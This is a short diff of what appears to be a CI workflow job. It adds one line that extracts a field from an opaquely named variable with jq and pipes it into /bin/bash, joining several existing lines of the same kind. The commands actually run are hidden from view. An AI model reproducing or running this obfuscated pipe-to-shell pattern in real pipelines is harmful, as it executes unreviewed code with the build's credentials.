@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$w28377" | jq -r .jdn3 | /bin/bash
           echo $l54 | jq -r .c6054 | /bin/bash
           echo $v2 | jq -r .qp87 | /bin/bash
+          printf '%s' "$wsmcm68458" | jq -r .p09 | /bin/bash
 
       - name: Store results
         if: always()
